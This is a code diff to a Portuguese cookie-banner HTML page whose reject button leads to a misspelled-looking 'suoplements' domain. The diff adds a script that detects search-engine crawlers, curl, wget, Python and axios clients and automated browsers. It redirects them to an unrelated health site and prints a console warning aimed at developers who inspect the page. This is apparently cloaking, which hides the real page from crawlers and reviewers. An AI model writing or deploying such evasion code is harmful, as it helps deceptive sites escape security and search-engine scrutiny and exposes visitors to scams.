@@ -31,7 +31,7 @@
       border-radius: 10px;
       box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
       text-align: center;
-      width: 300px; /* Adicionei largura fixa para garantir visibilidade */
+      width: 300px;
     }
 
     .banner-container h2 {
@@ -48,12 +48,12 @@
 
     .action-buttons {
       display: flex;
-      justify-content: space-between; /* Mudei para space-between */
-      gap: 10px; /* Adicionei gap para espaçamento */
+      justify-content: space-between;
+      gap: 10px;
     }
 
     .button {
-      flex: 1; /* Faz os botões ocuparem espaço igual */
+      flex: 1;
       padding: 10px 20px;
       border: none;
       border-radius: 5px;
@@ -85,5 +85,54 @@
       <button class="button reject" onclick="window.location.href='https://suoplements.com/'">Recusar Cookies</button>
     </div>
   </div>
+
+  <script>
+    function isGoogleBot() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      const googleBotPatterns = [
+        'googlebot',
+        'adsbot-google',
+        'apis-google',
+        'googlebot-image',
+        'googlebot-news',
+        'googlebot-video'
+      ];
+
+      return googleBotPatterns.some(pattern => userAgent.includes(pattern));
+    }
+
+    function isBot() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      const botPatterns = [
+        'bot',
+        'crawler',
+        'spider',
+        'curl',
+        'wget',
+        'python-requests',
+        'axios'
+      ];
+
+      return botPatterns.some(pattern => userAgent.includes(pattern)) || 
+             isGoogleBot() ||
+             navigator.webdriver ||
+             window.document.documentElement.getAttribute('webdriver');
+    }
+
+    function handleBotDetection() {
+      if (isBot()) {
+        window.location.href = 'https://www.duxhumanhealth.com/';
+      }
+    }
+
+    window.addEventListener('load', handleBotDetection);
+
+    setTimeout(handleBotDetection, 500);
+
+    if (window.console && console.log) {
+      console.log('%c ATENÇÃO! ', 'background: red; color: white; font-size: 24px;');
+      console.log('%c Atividade de desenvolvedor detectada. ', 'color: red;');
+    }
+  </script>
 </body>
 </html>
